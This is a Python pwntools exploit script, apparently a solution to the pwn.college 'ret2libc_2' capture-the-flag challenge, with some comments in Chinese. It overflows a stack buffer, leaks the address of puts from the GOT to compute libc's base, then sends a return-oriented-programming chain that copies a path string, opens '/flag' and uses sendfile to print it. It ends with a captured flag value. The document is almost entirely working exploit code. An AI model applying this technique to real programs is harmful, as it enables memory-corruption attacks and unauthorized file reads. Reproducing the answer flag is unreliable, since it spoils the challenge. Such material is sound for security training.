#!/usr/bin/python

from pwn import *

context(arch="amd64", os="linux")

libc_base = 0x00

# libc gadgets
buf_offset = 0x1ec780 # .data
slash_str_offset = 0x0c10 # "/\x00\x00\x00\x00\x00"
flag_str_offset = 0x1b1de0 # "flags"

pop_rdi_offset = 0x23b6a # pop rdi; ret
pop_rsi_offset = 0x2601f # pop rsi; ret
pop_rdx_offset = 0x142c92 # pop rdx; ret
ret_offset = 0x23b6b # ret

printf_offset = 0x61c90
puts_offset = 0x84420
open_offset = 0x10dce0
read_offset = 0x10dfc0
write_offset = 0x10e060
memcpy_offset = 0xbbad0
sendfile_offset = 0x112fa0

# ret2libc_2
puts_addr = 0x4011A5 # call puts; pop rbp; ret
pop_rdi_addr = 0x401413 # pop rid; ret
open_file_addr = 0x401196 # 用来调用puts
leave_message_addr = 0x4011C4


sh = process("/challenge/ret2libc_2")
print("pidof ret2libc_2:", proc.pidof(sh)[0])
sh.interactive()

payload = cyclic(0x30)  # 填满缓冲区
payload += cyclic(0x8)  # saved_rbp

payload += p64(pop_rdi_addr)
payload += p64(0x404018) # .got.plt puts

payload += p64(puts_addr) # puts(0x404098)
payload += cyclic(8)

payload += p64(leave_message_addr) # 调用levae_message 再溢出一次

sh.sendline(b'3')
sh.send(payload)
lines = sh.recvlines(numlines=3)
print(lines)
# 计算libc加载地址
libc_base = int.from_bytes(lines[1], byteorder="little") - puts_offset
print("libc base addr:", hex(libc_base))
# exit()``

payload = cyclic(0x30)  # 填满缓冲区
payload += cyclic(0x8)  # saved_rbp

payload += p64(pop_rdx_offset+libc_base)
payload += p64(0x4) # rdx=4

payload += p64(pop_rsi_offset+libc_base)
payload += p64(slash_str_offset+libc_base) # rsi="/\x00\x00\x00\x00\x00"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base) # rdi=buf

payload += p64(memcpy_offset+libc_base) # memcpy(buf, "/\x00\x00\x00\x00\x00", 4)


payload += p64(pop_rsi_offset+libc_base)
payload += p64(flag_str_offset+libc_base) # rsi="flags"

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base+1) # rdi=buf+1

payload += p64(memcpy_offset+libc_base) # memcpy(buf+1, "flags", 4)


payload += p64(pop_rsi_offset+libc_base)
payload += p64(0)   # rsi=0

payload += p64(pop_rdi_offset+libc_base)
payload += p64(buf_offset+libc_base)    # rdi=buf

payload += p64(open_offset+libc_base)   # open('/flag', 0)


payload += p64(open_file_addr) # puts("No No No")


# payload += p64(pop_rdx_offset+libc_base)
# payload += p64(0) # rdx=0

payload += p64(pop_rsi_offset+libc_base)
payload += p64(3) # rsi=3

payload += p64(pop_rdi_offset+libc_base)
payload += p64(1) # rdi=1

payload += p64(sendfile_offset+libc_base) # sendfile(1, 3, ..., ...)

# print(hex(len(payload)))
# exit()

sh.send(payload)
sh.interactive()

# pwn.college{8IOABwh_G4_tb01lfwQU53FLA8J.QXwMDLyEzW}
